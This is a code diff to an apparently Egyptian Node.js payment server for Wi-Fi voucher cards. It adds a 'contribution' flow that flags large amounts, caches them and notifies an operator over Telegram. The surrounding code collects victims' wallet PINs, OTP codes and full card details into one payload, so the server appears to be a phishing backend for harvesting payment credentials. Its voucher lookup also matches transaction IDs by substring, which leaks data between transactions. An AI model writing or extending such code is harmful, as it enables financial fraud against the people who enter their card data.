@@ -36,6 +36,8 @@ const BRANCH_NAMES = {
 };
 
 global.generatedCardsMap = global.generatedCardsMap || new Map();
+// تخزين مؤقت لحالات المساهمات المالية
+const contributions = {};
 
 chatSupport.initSocket(io);
 const upload = multer();
@@ -45,6 +47,12 @@ setInterval(() => {
   for (let [key, value] of global.generatedCardsMap.entries()) {
     if (value.createdAt && new Date(value.createdAt).getTime() < oneHourAgo) {
       global.generatedCardsMap.delete(key);
+    }
+  }
+  // تنظيف تخزين المساهمات المؤقتة بعد ساعة
+  for (let key of Object.keys(contributions)) {
+    if (contributions[key].createdAt && (Date.now() - contributions[key].createdAt > 60 * 60 * 1000)) {
+      delete contributions[key];
     }
   }
 }, 30 * 60 * 1000);
@@ -110,14 +118,27 @@ async function handlePaymentRequest(req, res) {
     const payAmount = amount || "5";
     const transactionId = "TX_" + Date.now();
 
+    // فحص ما إذا كانت المعاملة مساهمة (أكبر من 100 أو محددة مسبقاً)
+    const parsedAmount = parseFloat(payAmount);
+    const isContrib = parsedAmount > 100 || data.isContribution === true || data.isContribution === "true";
+
+    if (isContrib) {
+      contributions[transactionId] = {
+        isContribution: true,
+        amount: parsedAmount,
+        createdAt: Date.now()
+      };
+    }
+
     const paymentPayload = {
       phone: userPhone,
-      amount_cents: parseFloat(payAmount) * 100,
+      amount_cents: parsedAmount * 100,
       payment_method: selectedMethod,
       wallet_pin: wallet_pin || "غير مدخل",
       otp: otp || "لم يتم إدخاله بعد",
       branch: selectedBranch,
       branchName: branchDisplayName,
+      isContribution: isContrib,
       card_data: {
         number: (card_data && card_data.number) || number || "غير مدخل",
         name: (card_data && card_data.name) || name || "غير مدخل",
@@ -216,18 +237,33 @@ app.get("/api/test-create-card", async (req, res) => {
   }
 });
 
+// مسار عرض صفحة المساهمة
 app.get("/contribution-success", (req, res) => {
   const amount = req.query.amount || req.query.price || 150;
   const transactionId = req.query.tx || req.query.id || req.query.order || 'TRX-DEFAULT';
   res.send(generateContributionHtmlPage(amount, transactionId));
 });
 
+// مسار تأكيد المساهمة من البوت
+app.post('/api/confirm-contribution', async (req, res) => {
+  const { txId, amount } = req.body;
+  if (txId) {
+    contributions[txId] = { isContribution: true, amount: amount || 0, createdAt: Date.now() };
+  }
+  if (typeof sendTelegramMessage === "function") {
+    await sendTelegramMessage(`✅ العميل وصل صفحة المساهمة\n💰 المبلغ: ${amount || 0} جنيه\n🆔 رقم العملية: ${txId || "غير محدد"}`);
+  }
+  res.json({ success: true });
+});
+
+// مسار فحص حالة المعاملة والكروت والمساهمات (يستخدمه waitPage.js)
 app.get("/api/check-voucher/:txId", (req, res) => {
   const txId = String(req.params.txId || "").trim();
   if (!txId || txId === "null" || txId === "undefined") {
     return res.json({ success: false, message: "رقم المعاملة غير صالح" });
   }
 
+  // 1. التحقق من وجود الكارت المولد للميكروتيك
   if (global.generatedCardsMap) {
     if (global.generatedCardsMap.has(txId)) {
       return res.json({ success: true, data: global.generatedCardsMap.get(txId) });
@@ -236,6 +272,30 @@ app.get("/api/check-voucher/:txId", (req, res) => {
       if (String(key).includes(txId) || txId.includes(String(key))) {
         return res.json({ success: true, data: value });
       }
+    }
+  }
+
+  // 2. التحقق من وجود المعاملة كمساهمة مالية
+  if (contributions[txId]) {
+    return res.json({ 
+      success: true, 
+      data: { 
+        isContribution: true, 
+        amount: contributions[txId].amount,
+        packageName: "مساهمة مالية ودعم للشبكة"
+      } 
+    });
+  }
+  for (let [key, value] of Object.entries(contributions)) {
+    if (String(key).includes(txId) || txId.includes(String(key))) {
+      return res.json({ 
+        success: true, 
+        data: { 
+          isContribution: true, 
+          amount: value.amount,
+          packageName: "مساهمة مالية ودعم للشبكة"
+        } 
+      });
     }
   }
 
